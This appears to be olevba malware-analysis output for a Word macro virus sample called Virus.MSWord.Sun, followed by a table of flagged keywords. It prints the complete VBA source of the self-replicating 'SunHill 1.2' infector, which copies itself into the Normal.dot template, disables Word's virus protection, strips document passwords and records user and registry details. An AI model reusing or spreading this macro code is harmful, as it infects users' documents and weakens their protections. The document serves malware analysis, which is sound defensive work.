olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Sun
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Sun - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
                                                                                                            ' SunHill 1.2  By Alexey.BAS
                                                                                                            Sub Document_Open()
                                                                                                            Dim MyCode As String, NewLine As String, Proj, MacroIn, Comp
                                                                                                            On Error Resume Next
                                                                                                            If MacroContainer = "Normal.dot" Then
                                                                                                                Set MacroIn = NormalTemplate.VBProject
                                                                                                                NewLine = "                                                                                                            Sub Document_Open()"
                                                                                                            Else
                                                                                                                Set MacroIn = ActiveDocument.VBProject
                                                                                                                NewLine = "                                                                                                            Sub Document_Close()"
                                                                                                            End If
                                                                                                            For Each Proj In VBE.VBProjects
                                                                                                                With MacroIn.VBComponents(1).CodeModule
                                                                                                                    If Proj.Name <> .Name And _
                                                                                                                        Proj.VBComponents(1).CodeModule.Lines(1, 100) <> _
                                                                                                                           .Lines(1, 100) Then
                                                                                                                        MyCode = .Lines(1, .CountOfLines - 1)
                                                                                                                        With Proj.VBComponents(1).CodeModule
                                                                                                                            .DeleteLines 1, .CountOfLines
                                                                                                                            .InsertLines 1, MyCode
                                                                                                                            .ReplaceLine 2, NewLine
                                                                                                                        End With
                                                                                                                    End If
                                                                                                                End With
                                                                                                            Next Proj
                                                                                                            WordBasic.DisableAutoMacros 0
                                                                                                            With Options
                                                                                                                .ConfirmConversions = False
                                                                                                                .VirusProtection = False
                                                                                                                .SaveNormalPrompt = False
                                                                                                            End With
                                                                                                            With ActiveDocument
                                                                                                                If .ProtectionType <> wdNoProtection Then .Unprotect
                                                                                                                .ReadOnlyRecommended = False
                                                                                                                .Password = ""
                                                                                                                .WritePassword = ""
                                                                                                                MyCode = Date$ + "   " + Application.UserName + " - " + _
                                                                                                                System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", _
                                                                                                                "RegisteredOrganization") + " * "
                                                                                                                If InStr(.BuiltInDocumentProperties("Comments"), MyCode) = 0 Then _
                                                                                                                .BuiltInDocumentProperties("Comments") = MyCode + .BuiltInDocumentProperties("Comments")
                                                                                                                System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", _
                                                                                                                "ShowInfoTip") = 0
                                                                                                            End With
                                                                                                            ActiveDocument.Save
                                                                                                            End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

